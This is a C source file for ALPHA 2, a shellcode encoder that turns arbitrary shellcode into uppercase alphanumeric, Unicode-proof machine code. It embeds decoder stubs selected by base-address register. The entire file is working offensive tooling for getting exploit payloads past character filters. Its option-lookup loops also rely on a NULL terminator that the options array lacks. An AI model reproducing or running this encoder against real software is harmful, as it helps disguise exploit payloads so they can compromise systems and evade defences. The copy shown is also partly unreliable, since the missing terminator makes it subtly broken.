#include <stdio.h> // printf(), fprintf(), stderr
#include <stdlib.h> // exit(), EXIT_SUCCESS, EXIT_FAILURE, srand(), rand()
#include <string.h> // strcasecmp(), strstr()
#include <sys/time.h> //struct timeval, struct timezone, gettimeofday()
/*
________________________________________________________________________________

    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance. (build 06)
   SS"  Y$P"  SY"  ,SY 
  iS'   dY       ,sS"   Unicode-proof uppercase alphanumeric shellcode encoding.
  YS,  dSb    ,sY"      Copyright (C) 2003, 2004 by Berend-Jan Wever.
  `"YSS'"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>
________________________________________________________________________________

Acknowledgements:
  Thanks to rix for his phrack article on aphanumeric shellcode.
  Thanks to obscou for his phrack article on unicode-proof shellcode.
  Thanks to Costin Ionescu for the idear behind w32 SEH GetPC code.
  Thanks to 0dd for help, information and feedback.
*/

#define unicode_main "QATAXAZAPA3QADAZABARALAYAQAIAQAIAQAPA5AAAPAZAJ1AIAIAI11" \
       "AIAIAI1AAABABABQIAIQIAIQI111AIAIAIAXA59AA5RAAPAZ1AYAZAAAAAAAAAMAHB954JD"
struct option {
  char* id; // id of option
  char* code; // the decoder
} options[] = {
  { "eax",      "PPYA4" unicode_main },
  { "ebx",      "SSYA4" unicode_main },
  { "ecx",      "44444" unicode_main },
  { "edx",      "RRYA4" unicode_main },
  { "esp",      "VVYA4" unicode_main },
  { "ebp",      "WWYA4" unicode_main },
  { "esi",      "TUYA4" unicode_main },
  { "edi",      "UUYA4" unicode_main },
  { "[esp]",    "YA444" unicode_main },
  { "[esp+4]",  "YUYA4" unicode_main }
};

void usage(char* name) {
  int i=0;
  printf(
    "____________________________________________________________________________\n"
    "\n"
    "    ,sSSs,,s,  ALPHA 2: Zero-tolerance. (build 06)\n"
    "   SS\"  Y$P\"\n"
    "  iS'   dY     Unicode-proof, uppercase, alphanumeric shellcode encoding.\n"
    "  YS,  dSb     Copyright (C) 2004 by Berend-Jan Wever.\n"
    "  `\"YSS'\"S'    <skylined@edup.tudelft.nl>\n"
    "____________________________________________________________________________\n"
    "\n"
    "Usage: %s baseaddress\n"
    "  Reads shellcode from stdin and encodes it to stdout. Resulting code contains\n"
    "  only uppercase alphanumeric characters (0-9 and A-Z) and is unicode-proof. It\n"
    "  is a fully working version of the origional shellcode.\n"
    "\n"
    "  The decoder needs to know the baseaddress of it's own code. You must specify\n"
    "  the source of the baseaddress. Accepted values include:\n", name
  );
  while (options[i].id != NULL) {
    printf(i==0 ? "    %s" : ", %s", options[i].id);
    i++;
  }
  printf(
    "\n"
    "  Note that some of the options that use esp require that ebp points to\n"
    "  writeable memory and that the byte [ebp] will be overwritten with an\n"
    "  arbitrary value!\n"
    "\n", name
  );
}

//-----------------------------------------------------------------------------
int main(int argc, char* argv[], char* envp[]) {
  int   i, j;
  int   input, A, B, C, D, E, F;
  char* valid_chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";

  // Random seed  
  struct timeval tv;
  struct timezone tz;
  gettimeofday(&tv, &tz);
  srand((int)tv.tv_sec*tv.tv_usec);

  if (argc==2) {
    i=0;
    while (strcasecmp(argv[1], options[i].id) != 0) {
      i++;
      if (options[i].id == NULL) {
        fprintf(stderr, "Encoding option \"%s\" not found!\n", argv[1]);
        exit(EXIT_FAILURE);
      }
    }
  } else {
    usage(argv[0]);
    exit(EXIT_FAILURE);
  }
  // Output decoders and stuff
  printf("%s", options[i].code);

  while ((input = getchar()) != EOF) {
    // encoding AB -> CD 00 EF 00
    A = (input & 0xf0) >> 4;
    B = (input & 0x0f);

    F = B;
    // E is arbitrary as long as EF is a valid character
    i = rand() % strlen(valid_chars);
    while ((valid_chars[i] & 0x0f) != F) { i = ++i % strlen(valid_chars); }
    E = valid_chars[i] >> 4;

    D = (A-E) & 0x0f;
    // C is arbitrary as long as CD is a valid character
    i = rand() % strlen(valid_chars);
    while ((valid_chars[i] & 0x0f) != D) { i = ++i % strlen(valid_chars); }
    C = valid_chars[i] >> 4;

    printf("%c%c", (C<<4)+D, (E<<4)+F);
  }

  exit(EXIT_SUCCESS);
}
